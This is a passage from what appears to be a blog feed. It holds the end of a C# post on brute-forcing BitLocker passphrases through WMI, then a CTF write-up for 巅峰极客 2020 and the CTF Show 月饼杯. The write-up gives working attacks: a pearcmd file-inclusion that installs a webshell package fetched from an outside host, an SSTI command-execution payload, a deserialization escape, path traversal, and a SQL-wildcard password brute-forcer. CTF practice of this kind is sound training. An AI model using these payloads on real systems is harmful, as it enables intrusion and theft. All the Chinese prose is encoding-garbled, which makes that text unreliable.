class="meta-string">&quot;LockStatus&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Status&#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> UnlockStatus <span class="title">UnlockWithPassphrase</span>(<span class="params"><span class="built_in">string</span> passphrase</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;UnlockStatus&gt;(<span class="keyword">this</span>, <span class="keyword">new</span> &#123; Passphrase = passphrase &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UnlockStatus</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">uint</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸»è¦é€»è¾‘"><a href="#ä¸»è¦é€»è¾‘" class="headerlink" title="ä¸»è¦é€»è¾‘"></a>ä¸»è¦é€»è¾‘</h3><p>ç¬¬ä¸€æ­¥å®ä¾‹åŒ–äº†ä¸€ä¸ª <code>WMIHelper</code>ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨å®ƒçš„ <code>Query</code> æ–¹æ³•å»æŸ¥è¯¢å‡ºæ‰€æœ‰çš„ <code>EncryptableVolume</code> å¾—åˆ°ä¸€ä¸ª Listã€‚ç„¶åéå†ä¹‹åä½¿ç”¨ <code>GetLockStatus()</code> å»æŸ¥è¯¢çŠ¶æ€ï¼Œå½“çŠ¶æ€ä¸º&nbsp;<ruby>Locked<rt>1</rt></ruby>&nbsp;çš„æ—¶å€™å°±è¯»å–å­—å…¸è°ƒç”¨è§£é”æ–¹æ³•å°è¯•è§£é”ç›´åˆ° <code>ReturnValue</code> ä¸º&nbsp;<ruby>S_OK<rt>0x0</rt></ruby>&nbsp;çš„æ—¶å€™ å³è§£é”æˆåŠŸï¼Œå½“è§£é”ä¸æˆåŠŸæ—¶å°†å¾—åˆ°è¿”å›å€¼&nbsp;<ruby>FVE_E_FAILED_AUTHENTICATION<rt>0x80310027</rt></ruby>ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">int</span> LOCKED = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">uint</span> FVE_E_FAILED_AUTHENTICATION = <span class="number">0x80310027</span>;</span><br><span class="line">    WMIHelper helper = <span class="keyword">new</span> WMIHelper(<span class="string">&quot;Root\\CIMV2\\Security\\MicrosoftVolumeEncryption&quot;</span>);</span><br><span class="line">    List&lt;EncryptableVolume&gt; volumes = helper.Query&lt;EncryptableVolume&gt;().ToList();</span><br><span class="line">    <span class="keyword">foreach</span>(EncryptableVolume volume <span class="keyword">in</span> volumes)&#123;</span><br><span class="line">        <span class="keyword">var</span> lockStatus = volume.GetLockStatus();</span><br><span class="line">        <span class="keyword">if</span>(lockStatus.Status == LOCKED)&#123;</span><br><span class="line">            <span class="comment">//BruteForceHere</span></span><br><span class="line">        &#125;</span><br><span class="line">        Console.WriteLine(lockStatus.Status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è®°"><a href="#è®°" class="headerlink" title="è®°"></a>è®°</h2><p>è¿™ç¯‡æ–‡ç« å†™å¾—ä¸æ˜¯å¾ˆç»†ï¼Œå› ä¸ºæ–‡æ¡£ä¸Šè®°è½½äº†å¾ˆå¤šä¸ä¸€æ ·çš„æ–¹æ³•ä»¥åŠæ“ä½œï¼Œå¾®è½¯çš„æ–‡æ¡£å†™å¾—å·¨ç»†é¡é—çš„åŒæ—¶åˆæåº¦ä¸¥è°¨ã€‚å› ä¸ºæ„Ÿè§‰åšçš„æ—¶å€™èµ„æ–™ä¸æ˜¯å¤ªå¤šï¼Œæ‰€ä»¥å†™å‡ºæ¥å¸Œæœ›èƒ½æä¾›ä¸€äº›æ­£ç¡®ä¸”æœ‰æ„ä¹‰çš„å‚è€ƒã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå·¥å…·è£…ä¸ä¸Šå°±è‡ªå·±å†™ä¸€ä¸ªæ—¢å®šä½œç”¨çš„è¿™ä»¶äº‹è¿˜æ˜¯è›®å¥½ç©çš„ï¼Œè™½ç„¶æ•ˆç‡åº”è¯¥æ˜¯æ¯”ä¸ä¸ŠæŸè£…äº†è›®ä¹…æ²¡è£…ä¸Šçš„å·¥å…·ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> StudyNote </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> Skill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·…å³°æå®¢ 2020 &amp; CTF Show æœˆé¥¼æ¯</title>
      <link href="/zh-CN/posts/9b2fbf24.html"/>
      <url>/zh-CN/posts/9b2fbf24.html</url>
      
        <content type="html"><![CDATA[<p>æ˜¯å¥½ç©çš„æ¯”èµ›çš„ WriteUpï¼</p><h2 id="å·…å³°æå®¢-2020"><a href="#å·…å³°æå®¢-2020" class="headerlink" title="å·…å³°æå®¢ 2020"></a>å·…å³°æå®¢ 2020</h2><h3 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h3><p>é¦–å…ˆçœ‹ hint <code>register_argc_argv</code> ï¼Œæ‰“å¼€ç¯å¢ƒä¹‹åå‘ç°åœ¨ <code>index.php</code> æœ‰ä¸€ä¸ªç®€å•çš„æ–‡ä»¶åŒ…å«ã€‚ç”¨ PHP ä¼ªåè®®è¯»å–ä¸€åœˆæ–‡ä»¶ï¼Œå‘ç°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>] ?? <span class="string">&quot;home&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;<span class="subst">&#123;$f&#125;</span>.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ® hint å¯çŸ¥ï¼Œ<code>argc</code> å’Œ <code>argv</code> ä¸¤ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šï¼Œå‚è€ƒ <a href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/">è¿™ç¯‡æ–‡ç« </a> å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥éœ€è¦åšä»€ä¹ˆã€‚æ—¢ç„¶è¦ç”¨ <code>pearcmd</code>ï¼Œå½“ç„¶æ˜¯é¦–å…ˆè¯»ä¸€æ‰‹æºç ï¼Œäºæ˜¯åˆ©ç”¨ä¸Šé¢çš„æ„é€ è¯»å–å‡º <code>pearcmd</code> çš„æºç ï¼Œæ‰¾åˆ°å…³é”®éƒ¨åˆ†å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Safely read the $argv PHP array across different PHP configurations.</span></span><br><span class="line"><span class="comment">     * Will take care on register_globals and register_argc_argv ini directives</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed the $argv PHP array or PEAR error if not registered</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç° <code>argv</code> ä¼šè¢«å½“æˆå‚æ•°è¿”å›ï¼Œäºæ˜¯æ„é€  <code>?f=pearcmd&amp;argv=2+list</code>ï¼Œå¾—åˆ°å›æ˜¾å¦‚ä¸‹ï¼Œäºæ˜¯æŒ‰ç…§æ–‡ç« ä¸Šçš„æŒ‡å¼•ï¼Œå‡†å¤‡ä¸€ä¸ªåŒ…ã€‚</p><p>é¦–å…ˆä¸‹è½½ <a href="http://download.pear.php.net/package/Archive_Tar-1.4.0.tgz">è¿™ä¸ªåŒ…</a>ï¼Œç„¶ååœ¨ <code>Archive_Tar-1.4.0/Archive</code> ä¸‹å¢åŠ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬çš„ PHP æ–‡ä»¶ <code>zit.php</code>ã€‚ç„¶åå°† <code>./package.xml</code> æ–‡ä»¶ä¸­çš„ <code>&lt;content&gt;</code> èŠ‚ç‚¹å¯¹åº”ä¿®æ”¹å¦‚ä¸‹ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contents</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dir</span> <span class="attr">name</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;89b230679f31da6f8dbdea25095f4ca9&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Archive/Tar.php&quot;</span> <span class="attr">role</span>=<span class="string">&quot;php&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;7cc168393304c0c9c0de96d5e5e318e0&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Archive/zit.php&quot;</span> <span class="attr">role</span>=<span class="string">&quot;doc&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">file</span> <span class="attr">baseinstalldir</span>=<span class="string">&quot;/&quot;</span> <span class="attr">md5sum</span>=<span class="string">&quot;2fb90f0be7089a45c09a0d1182792419&quot;</span> <span class="attr">name</span>=<span class="string">&quot;docs/Archive_Tar.txt&quot;</span> <span class="attr">role</span>=<span class="string">&quot;doc&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dir</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">contents</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°†æ•´ä¸ªåŒ…æŒ‰åŸæ ¼å¼å‹ç¼©è¿˜åŸä¸º <code>tar.gz</code>ï¼Œç„¶åä¸Šä¼ è‡³æœåŠ¡å™¨è·å–æ”¯é“¾ <code>https://v2.api.lemonprefect.cn/static/zips/zit.tar.gz</code>ã€‚æ¥ä¸‹æ¥æ„é€  <code>?f=pearcmd&amp;argv=list+install+--installroot+/tmp/+https://v2.api.lemonprefect.cn/static/zips/zit.tar.gz</code>ï¼Œå¾—åˆ°åŒ…å®‰è£…æˆåŠŸçš„å›æ˜¾ <code>install ok: channel://pear.php.net/Archive_Tar-1.4.0</code>ã€‚</p><p>æ­¤æ—¶åªéœ€è¦æ‰¾åˆ° <code>zit.php</code> çš„è·¯ç”±å³å¯ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªä¹‹åçœ‹åˆ°æŠ¥é”™ä¸­çš„å…³é”®ä¿¡æ¯ <code>include_path=&#39;.:/usr/local/lib/php&#39;</code>ï¼Œäºæ˜¯æ‹¼åˆåŒ…çš„è·¯å¾„ä¹‹åè®¿é—® <code>/tmp/usr/local/lib/php/doc/Archive_Tar/Archive/zit</code> æ‹¿åˆ° shell çš„è·¯ç”±ã€‚ä½¿ç”¨èšå‰‘è¿æ¥ä¸Šå»ï¼Œå¯ä»¥çœ‹åˆ° <code>/readflag</code>ã€‚</p><p>æ‰§è¡Œ <code>/readflag</code> æ—¶å‘ç°éœ€è¦è®¡ç®—ç®—æœ¯é¢˜ï¼Œä½†æ˜¯é»˜è®¤çš„è™šæ‹Ÿç»ˆç«¯æ²¡æœ‰äº¤äº’ï¼Œäºæ˜¯ä½¿ç”¨ perl è„šæœ¬å®Œæˆè¿™ä¸€æ­¥ã€‚åœ¨ <code>/tmp/tmp</code> ç›®å½•ä¸‹å†™å…¥è„šæœ¬å¹¶æ‰§è¡Œå³å¯å¾— flagã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">&#x27;/readflag&#x27;</span> )</span><br><span class="line">  <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;open3() failed $!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">substr</span>($r,<span class="number">0</span>,<span class="number">11</span>);</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">&quot;$r\n&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;$r&quot;</span>;</span><br></pre></td></tr></table></figure><div align=center><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156090448/1f378a59ca61b45569e160e6e64d5492359d9222.png" alt="perl è„šæœ¬æ‰§è¡Œå¾—åˆ° flag"></p></div><h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>çœ‹ç•Œé¢ï¼Œè€ Whoami äº†ã€‚ç›´æ¥çœ‹è¯·æ±‚ï¼Œå‘ç°æ˜¯ SSTIï¼Œä¸€å¥—æ ‡å‡†æ‹³æ‰“å‡ºï¼Œæ‹¿åˆ° flagã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../loged?name=&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><div align=center><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156174944/e118a27a9dfb1fed2e8882e9c237c5eff3dbd09d.png" alt="å›æ˜¾ flag"></p></div><h2 id="CTF-Show-æœˆé¥¼æ¯"><a href="#CTF-Show-æœˆé¥¼æ¯" class="headerlink" title="CTF Show æœˆé¥¼æ¯"></a>CTF Show æœˆé¥¼æ¯</h2><h3 id="æ­¤å¤œåœ†"><a href="#æ­¤å¤œåœ†" class="headerlink" title="æ­¤å¤œåœ†"></a>æ­¤å¤œåœ†</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> str_replace(<span class="string">&#x27;Firebasky&#x27;</span>, <span class="string">&#x27;Firebaskyup&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>æ­¤å¤„é€ æˆäº†ç®€å•çš„ååºåˆ—åŒ–é€ƒé€¸ï¼Œ<code>Firebasky</code> è¢«æ›¿æ¢æˆ <code>Firebaskyup</code>ï¼Œå­—ç¬¦å¤šå‡ºä¸¤ä¸ªã€‚éœ€è¦æ„é€ çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²å¯ä»¥å†™æˆè¿™æ ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;s:(è¿™é‡Œæ˜¯é•¿åº¦):<span class="string">&quot;(è¿™é‡Œæ˜¯ç”¨æˆ·å)&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;yu22x&quot;</span>;&#125;<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>æ€»å…±å¡«å……äº† 30 ä¸ªå­—ç¬¦ <code>&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</code>ï¼Œå› æ­¤éœ€è¦ 15 æ¬¡æ›¿æ¢æ‰èƒ½å°†è¿™ 30 ä¸ªå­—ç¬¦å˜æˆåé¢çš„ååºåˆ—åŒ–å†…å®¹ã€‚<br>äºæ˜¯æ„é€ å‡ºè¿™æ ·çš„ payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;FirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•…äººå¿ƒ"><a href="#æ•…äººå¿ƒ" class="headerlink" title="æ•…äººå¿ƒ"></a>æ•…äººå¿ƒ</h3><p><strong>level 1</strong><br>ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•è¡¨è¾¾ä¸€ä¸ªæå°çš„å°æ•°ï¼Œé‡‡ç”¨ <code>1e-199</code>ã€‚<br><strong>level 2</strong><br>è®¿é—® <code>.../robots.txt</code> å¯ä»¥å‘ç° <code>hinthint.txt</code> è¿›è€Œæ‰¾åˆ°å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#39;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure><p>äºæ˜¯å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ <code>b</code> å’Œ <code>c</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt;= <span class="number">999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$b</span> = sprintf(<span class="string">&quot;0e%03d&quot;</span>,<span class="variable">$i</span>) . <span class="string">&quot;024452&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span> == hash(<span class="string">&quot;md2&quot;</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;b = &quot;</span> . <span class="variable">$b</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">9999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$c</span> = sprintf(<span class="string">&quot;0e%04d&quot;</span>,<span class="variable">$i</span>) . <span class="string">&quot;48399&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$c</span> == hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>,<span class="variable">$c</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;c = &quot;</span> . <span class="variable">$c</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>b = 0e652024452ï¼Œc = 0e603448399</code>ã€‚<br><strong>level 3</strong></p><blockquote><p>php ä¼šæŠŠæ— æ³•è§£æçš„åè®®å½“æˆç›®å½•</p></blockquote><p>å› æ­¤ï¼Œç»“åˆç›®å½•ç©¿è¶Šå°±èƒ½è¯»åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lemon:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt</span><br></pre></td></tr></table></figure><h3 id="è«è´Ÿå©µå¨Ÿ"><a href="#è«è´Ÿå©µå¨Ÿ" class="headerlink" title="è«è´Ÿå©µå¨Ÿ"></a>è«è´Ÿå©µå¨Ÿ</h3><p>é¦–å…ˆçœ‹ä¸€æ‰‹é¡µé¢æºç ï¼Œå¾—åˆ°è¿™æ ·çš„ hintï¼Œç”¨æˆ·åæ˜¯ <code>yu22x</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--æ³¨æ„ï¼šæ­£å¼ä¸Šçº¿è¯·åˆ é™¤æ³¨é‡Šå†…å®¹ï¼ --&gt;</span><br><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#39;$username&#39;) and password like binary(&#39;$password&#39;)--&gt;</span><br></pre></td></tr></table></figure><p>ç»“åˆé¢˜ç›®æè¿°çš„ hint <code>ç¯å¢ƒå˜é‡ +linuxå­—ç¬¦ä¸²æˆªå– + é€šé…ç¬¦</code>ï¼Œå°è¯•ä¸€æ³¢ SQL çš„é€šé…ç¬¦ã€‚</p><div align=center><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/3288e007-47a8-4869-8d8c-a2c31f2d3e97/1613214156234379/e7f79b2646c79d2988d11b9b3c85d610ad788690.png" alt="å¿«çœ‹ï¼æ˜¯é€šé…ç¬¦å‘å‘å‘"></p></div><p>ä¾ç…§ä¸Šå›¾çš„ç»“æœæ„é€ ä¸€æ³¢ payload å‘ç°å½“ <code>password</code> å‚æ•°ä¸º <code>6_______________________________</code> æ—¶å›æ˜¾æ˜¯ä¸ä¸€æ ·çš„ï¼Œäºæ˜¯å†™ä¸ªè„šæœ¬è·‘å‡ºå¯†ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> ASCII_START = <span class="number">32</span>;</span><br><span class="line"><span class="keyword">const</span> ASCII_END = <span class="number">127</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;6&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">31</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$p</span> = sprintf(<span class="string">&quot;%0&quot;</span> . (<span class="number">30</span> - <span class="variable">$i</span>) . <span class="string">&quot;d&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="number">30</span>)&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span> = str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = ASCII_START;<span class="variable">$j</span> &lt;= ASCII_END;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span> == <span class="number">95</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">//no &quot;_&quot; to be matched</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&#x27;.../login.php&#x27;</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        <span 